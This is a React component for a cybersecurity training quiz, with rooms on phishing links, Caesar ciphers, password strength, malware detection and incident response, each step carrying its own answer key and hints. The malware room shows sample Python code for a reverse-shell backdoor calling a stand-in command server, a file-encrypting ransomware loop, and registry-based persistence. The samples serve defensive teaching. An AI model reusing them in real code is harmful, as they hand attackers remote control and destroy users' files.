
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { Textarea } from "@/components/ui/textarea";
import { ArrowLeft, Clock, Trophy, Shield, AlertCircle, CheckCircle, Lightbulb, Target } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const Room = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const [currentStep, setCurrentStep] = useState(0);
  const [userAnswer, setUserAnswer] = useState('');
  const [timeElapsed, setTimeElapsed] = useState(0);
  const [score, setScore] = useState(0);
  const [hints, setHints] = useState<string[]>([]);
  const [showHint, setShowHint] = useState(false);

  // Room data based on ID
  const getRoomData = (roomId: string) => {
    const rooms = {
      '1': {
        title: "Phishing Link Detector",
        description: "Learn to identify suspicious URLs and protect against phishing attacks",
        totalSteps: 4,
        steps: [
          {
            title: "Welcome to the Phishing Lab",
            description: "You're a security analyst who just received an urgent email. Your task is to determine if the links are legitimate or malicious.",
            type: "info",
            content: "A colleague forwarded you an email claiming to be from your bank asking you to verify your account immediately. Let's analyze the suspicious elements together.",
            question: "Ready to start analyzing? Type 'ready' to continue.",
            answer: "ready",
            hints: ["This is just the introduction - type 'ready' to begin!"]
          },
          {
            title: "URL Structure Analysis",
            description: "Examine this suspicious URL and identify the red flags",
            type: "analysis",
            content: "URL: https://secure-bankofamerica-verification.suspicious-domain.com/login?ref=urgent",
            question: "What's the main red flag in this URL? (Hint: Look at the domain name)",
            answer: "domain",
            hints: [
              "Pay attention to the actual domain name after 'https://'",
              "The real Bank of America website would use 'bankofamerica.com' as the domain",
              "Look for 'suspicious-domain.com' - this is not the legitimate bank domain"
            ]
          },
          {
            title: "Email Header Investigation",
            description: "Now let's examine the email headers for authenticity",
            type: "investigation",
            content: "From: security@bank-of-america.support.phishing-site.net\nSubject: URGENT: Verify Your Account NOW!\nReply-To: noreply@suspicious-emails.com",
            question: "What indicates this email is fraudulent? (Hint: Check the sender domain)",
            answer: "sender",
            hints: [
              "Look at the 'From' field carefully",
              "Legitimate banks use their official domain names",
              "The sender is using 'phishing-site.net' which is clearly not official"
            ]
          },
          {
            title: "Social Engineering Tactics",
            description: "Identify the psychological manipulation techniques used",
            type: "analysis",
            content: "Email body: 'Your account will be CLOSED in 24 hours unless you verify immediately! Click here NOW to avoid account suspension. This is your FINAL warning!'",
            question: "What social engineering tactic is being used here?",
            answer: "urgency",
            hints: [
              "Notice the language creating pressure",
              "Words like 'URGENT', 'NOW', 'FINAL warning' create what feeling?",
              "This tactic is called creating false urgency or time pressure"
            ]
          }
        ]
      },
      '2': {
        title: "Caesar Cipher Cracker",
        description: "Decode encrypted messages and learn cryptography fundamentals",
        totalSteps: 4,
        steps: [
          {
            title: "Welcome to Cryptography",
            description: "You've intercepted an encrypted message. Use your knowledge of Caesar ciphers to decode it.",
            type: "info",
            content: "A Caesar cipher shifts each letter by a fixed number of positions in the alphabet. For example, with a shift of 3, 'A' becomes 'D', 'B' becomes 'E', etc.",
            question: "Ready to crack some codes? Type 'ready' to continue.",
            answer: "ready",
            hints: ["Type 'ready' to begin your cryptography journey!"]
          },
          {
            title: "Simple Caesar Cipher",
            description: "Decrypt this message with a shift of 3",
            type: "decryption",
            content: "Encrypted message: 'DWWDFN DW GDZQ'",
            question: "What does this message say? (Hint: Shift each letter back by 3 positions)",
            answer: "attack at dawn",
            hints: [
              "Shift each letter backwards by 3 positions in the alphabet",
              "D becomes A, W becomes T, etc.",
              "The message is a common military phrase"
            ]
          },
          {
            title: "Unknown Shift Challenge",
            description: "This cipher uses an unknown shift value - you'll need to figure it out!",
            type: "challenge",
            content: "Encrypted message: 'KHOOR ZRUOG'",
            question: "Decrypt this message (try different shift values):",
            answer: "hello world",
            hints: [
              "Try different shift values from 1 to 25",
              "The shift value for this message is 3",
              "This is a common programming greeting"
            ]
          },
          {
            title: "Frequency Analysis",
            description: "Advanced technique: Use letter frequency to break the cipher",
            type: "advanced",
            content: "In English, 'E' is the most common letter, followed by 'T', 'A', 'O'. Look at this longer encrypted text: 'WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ'",
            question: "What's the decrypted message?",
            answer: "the quick brown fox jumps over the lazy dog",
            hints: [
              "Count the most frequent letters in the cipher",
              "The shift is 3 positions forward",
              "This is a famous pangram (contains every letter of the alphabet)"
            ]
          }
        ]
      },
      '3': {
        title: "Password Fortress",
        description: "Test password strength and understand entropy concepts",
        totalSteps: 4,
        steps: [
          {
            title: "Password Security Basics",
            description: "Learn what makes a password secure and why it matters",
            type: "info",
            content: "Password strength depends on length, complexity, and unpredictability. A strong password should resist both dictionary attacks and brute force attempts.",
            question: "Ready to test your password knowledge? Type 'ready' to start.",
            answer: "ready",
            hints: ["Type 'ready' to begin learning about password security!"]
          },
          {
            title: "Weak Password Analysis",
            description: "Identify why this password is vulnerable",
            type: "analysis",
            content: "Password: 'password123'",
            question: "Why is this password weak? (Name one major issue)",
            answer: "common",
            hints: [
              "This is one of the most commonly used passwords",
              "It appears in password dictionaries",
              "It uses predictable patterns (word + numbers)"
            ]
          },
          {
            title: "Password Entropy Calculator",
            description: "Calculate the strength of different passwords",
            type: "calculation",
            content: "Compare these passwords:\nA) cat\nB) C@t$2024!\nC) correct-horse-battery-staple",
            question: "Which password is strongest and why? (A, B, or C)",
            answer: "c",
            hints: [
              "Consider both length and complexity",
              "Longer passwords with random words can be very secure",
              "The passphrase method (option C) provides high entropy with memorability"
            ]
          },
          {
            title: "Brute Force Resistance",
            description: "Calculate how long it would take to crack different passwords",
            type: "math",
            content: "A 4-digit PIN has 10,000 possible combinations. An 8-character password with mixed case, numbers, and symbols has 94^8 possible combinations.",
            question: "Which would take longer to brute force crack?",
            answer: "8-character",
            hints: [
              "10,000 vs 94^8 combinations",
              "94^8 is approximately 6 quadrillion combinations", 
              "The 8-character complex password is exponentially stronger"
            ]
          }
        ]
      },
      '4': {
        title: "Malware Hunter",
        description: "Identify malicious code patterns and security vulnerabilities",
        totalSteps: 4,
        steps: [
          {
            title: "Introduction to Malware Detection",
            description: "Learn to spot suspicious code patterns and behaviors",
            type: "info",
            content: "Malware often exhibits recognizable patterns: unauthorized network connections, file system modifications, registry changes, and suspicious API calls.",
            question: "Ready to hunt for malware? Type 'ready' to begin.",
            answer: "ready",
            hints: ["Type 'ready' to start your malware hunting mission!"]
          },
          {
            title: "Suspicious Network Activity",
            description: "Analyze this network connection code",
            type: "code-analysis",
            content: "import socket\ns = socket.socket()\ns.connect(('suspicious-command-server.com', 4444))\nwhile True:\n    cmd = s.recv(1024)\n    os.system(cmd.decode())",
            question: "What type of malware behavior does this code exhibit?",
            answer: "backdoor",
            hints: [
              "This code connects to an external server",
              "It receives and executes commands from that server",
              "This is characteristic of a backdoor or remote access tool"
            ]
          },
          {
            title: "File System Manipulation",
            description: "Identify malicious file operations",
            type: "behavior-analysis",
            content: "for root, dirs, files in os.walk('C:\\\\'):\n    for file in files:\n        if file.endswith(('.doc', '.pdf', '.jpg')):\n            encrypt_file(os.path.join(root, file))\n            os.remove(os.path.join(root, file))",
            question: "What type of malware does this code represent?",
            answer: "ransomware",
            hints: [
              "The code walks through all files on the C: drive",
              "It encrypts common file types (documents, PDFs, images)",
              "Then it deletes the original files - this is ransomware behavior"
            ]
          },
          {
            title: "Registry Persistence",
            description: "Spot malware persistence techniques",
            type: "system-analysis",
            content: "import winreg\nkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', 0, winreg.KEY_SET_VALUE)\nwinreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, 'C:\\\\temp\\\\definitely_not_malware.exe')",
            question: "How is this malware achieving persistence?",
            answer: "startup",
            hints: [
              "Look at the registry key being modified",
              "The 'Run' key executes programs at startup",
              "The malware is ensuring it runs every time Windows starts"
            ]
          }
        ]
      },
      '5': {
        title: "Security Mastermind",
        description: "Challenge your cybersecurity knowledge with complex scenarios",
        totalSteps: 4,
        steps: [
          {
            title: "Welcome, Security Expert",
            description: "You're the Chief Security Officer facing a complex incident. Use all your knowledge to guide the response.",
            type: "info",
            content: "Your organization has detected unusual network activity. Multiple systems are showing signs of compromise. You need to lead the incident response.",
            question: "Ready for the ultimate challenge? Type 'ready' to begin.",
            answer: "ready",
            hints: ["Type 'ready' to face the ultimate cybersecurity challenge!"]
          },
          {
            title: "Incident Triage",
            description: "Multiple alerts are coming in - prioritize your response",
            type: "scenario",
            content: "Simultaneous alerts:\n1. Database server showing unusual queries\n2. CEO's laptop has suspicious network connections\n3. File server encryption in progress\n4. Login attempts from foreign IP addresses",
            question: "Which incident should you address FIRST? (1, 2, 3, or 4)",
            answer: "3",
            hints: [
              "Consider which threat could cause immediate, irreversible damage",
              "File encryption suggests ransomware - this spreads quickly",
              "Stopping ongoing encryption should be the top priority"
            ]
          },
          {
            title: "Attack Vector Analysis",
            description: "Determine how the attackers initially gained access",
            type: "forensics",
            content: "Timeline:\n- Monday: Employee John clicked email link\n- Tuesday: Unusual PowerShell activity detected\n- Wednesday: Lateral movement to file servers\n- Thursday: Mass encryption begins",
            question: "What was the likely initial attack vector?",
            answer: "phishing",
            hints: [
              "Look at the timeline - what happened on Monday?",
              "An employee clicked an email link",
              "This is the classic start of a phishing attack"
            ]
          },
          {
            title: "Recovery Strategy",
            description: "Plan the organization's recovery and future protection",
            type: "strategy",
            content: "The attack has been contained. Now you need to plan recovery and prevent future incidents. Consider: backups, employee training, network segmentation, and monitoring.",
            question: "What's the MOST important long-term security improvement?",
            answer: "training",
            hints: [
              "Remember how this attack started - with an employee clicking a link",
              "Technical controls can be bypassed, but informed employees are your best defense",
              "Security awareness training addresses the human element"
            ]
          }
        ]
      }
    };
    return rooms[roomId as keyof typeof rooms];
  };

  const roomData = getRoomData(id || '1');

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeElapsed(prev => prev + 1);
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = () => {
    const currentStepData = roomData.steps[currentStep];
    const isCorrect = userAnswer.toLowerCase().trim() === currentStepData.answer.toLowerCase();
    
    if (isCorrect) {
      setScore(score + 100);
      toast({
        title: "Correct!",
        description: "Well done! Moving to the next challenge.",
      });
      
      if (currentStep < roomData.totalSteps - 1) {
        setCurrentStep(currentStep + 1);
        setUserAnswer('');
        setShowHint(false);
        setHints([]);
      } else {
        // Room completed
        toast({
          title: "🎉 Room Completed!",
          description: `Congratulations! You've mastered ${roomData.title}`,
        });
        setTimeout(() => navigate('/rooms'), 2000);
      }
    } else {
      toast({
        title: "Not quite right",
        description: "Try again or use a hint for guidance.",
        variant: "destructive"
      });
    }
  };

  const getHint = () => {
    const currentStepData = roomData.steps[currentStep];
    const currentHints = currentStepData.hints || [];
    const nextHintIndex = hints.length;
    
    if (nextHintIndex < currentHints.length) {
      const newHints = [...hints, currentHints[nextHintIndex]];
      setHints(newHints);
      setShowHint(true);
      setScore(Math.max(0, score - 25)); // Penalty for using hints
    }
  };

  const currentStepData = roomData.steps[currentStep];
  const progress = ((currentStep + 1) / roomData.totalSteps) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900">
      {/* Header */}
      <div className="bg-slate-800/50 border-b border-slate-700">
        <div className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <Button
                variant="ghost"
                onClick={() => navigate('/rooms')}
                className="text-slate-400 hover:text-white"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Rooms
              </Button>
              <div>
                <h1 className="text-xl font-bold text-white">{roomData.title}</h1>
                <p className="text-slate-400 text-sm">{roomData.description}</p>
              </div>
            </div>
            
            <div className="flex items-center gap-6">
              <div className="flex items-center gap-2 text-slate-300">
                <Clock className="w-4 h-4" />
                <span>{formatTime(timeElapsed)}</span>
              </div>
              <div className="flex items-center gap-2 text-slate-300">
                <Trophy className="w-4 h-4 text-yellow-400" />
                <span>{score} pts</span>
              </div>
            </div>
          </div>
          
          {/* Progress Bar */}
          <div className="mt-4">
            <div className="flex justify-between text-sm text-slate-400 mb-2">
              <span>Step {currentStep + 1} of {roomData.totalSteps}</span>
              <span>{Math.round(progress)}% Complete</span>
            </div>
            <Progress value={progress} className="h-2" />
          </div>
        </div>
      </div>

      <div className="container mx-auto px-6 py-8">
        <div className="max-w-4xl mx-auto">
          <Card className="bg-slate-800/50 border-slate-700">
            <CardHeader>
              <div className="flex items-center gap-3 mb-4">
                <div className="w-10 h-10 bg-gradient-to-r from-blue-500 to-purple-500 rounded-lg flex items-center justify-center">
                  <Target className="w-5 h-5 text-white" />
                </div>
                <div>
                  <CardTitle className="text-white text-xl">{currentStepData.title}</CardTitle>
                  <CardDescription className="text-slate-300">
                    {currentStepData.description}
                  </CardDescription>
                </div>
              </div>
            </CardHeader>
            
            <CardContent className="space-y-6">
              {/* Content Display */}
              <div className="bg-slate-900/50 border border-slate-600 rounded-lg p-6">
                <pre className="text-slate-200 whitespace-pre-wrap font-mono text-sm leading-relaxed">
                  {currentStepData.content}
                </pre>
              </div>

              {/* Question */}
              <div className="space-y-4">
                <div className="flex items-start gap-3">
                  <AlertCircle className="w-5 h-5 text-blue-400 mt-0.5" />
                  <div>
                    <h3 className="text-white font-medium mb-1">Challenge</h3>
                    <p className="text-slate-300">{currentStepData.question}</p>
                  </div>
                </div>

                {/* Answer Input */}
                <div className="space-y-3">
                  {currentStepData.type === 'analysis' || currentStepData.type === 'investigation' ? (
                    <Textarea
                      placeholder="Enter your analysis..."
                      value={userAnswer}
                      onChange={(e) => setUserAnswer(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white"
                      rows={3}
                    />
                  ) : (
                    <Input
                      placeholder="Enter your answer..."
                      value={userAnswer}
                      onChange={(e) => setUserAnswer(e.target.value)}
                      className="bg-slate-700 border-slate-600 text-white"
                      onKeyDown={(e) => e.key === 'Enter' && handleSubmit()}
                    />
                  )}
                  
                  <div className="flex gap-3">
                    <Button 
                      onClick={handleSubmit}
                      className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700"
                      disabled={!userAnswer.trim()}
                    >
                      <CheckCircle className="w-4 h-4 mr-2" />
                      Submit Answer
                    </Button>
                    
                    <Button 
                      variant="outline"
                      onClick={getHint}
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                      disabled={hints.length >= currentStepData.hints.length}
                    >
                      <Lightbulb className="w-4 h-4 mr-2" />
                      Get Hint ({hints.length}/{currentStepData.hints.length})
                    </Button>
                  </div>
                </div>

                {/* Hints Display */}
                {hints.length > 0 && (
                  <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4">
                    <div className="flex items-start gap-2">
                      <Lightbulb className="w-4 h-4 text-yellow-400 mt-0.5" />
                      <div>
                        <h4 className="text-yellow-400 font-medium mb-2">Hints</h4>
                        <div className="space-y-2">
                          {hints.map((hint, index) => (
                            <p key={index} className="text-yellow-200 text-sm">
                              {index + 1}. {hint}
                            </p>
                          ))}
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default Room;
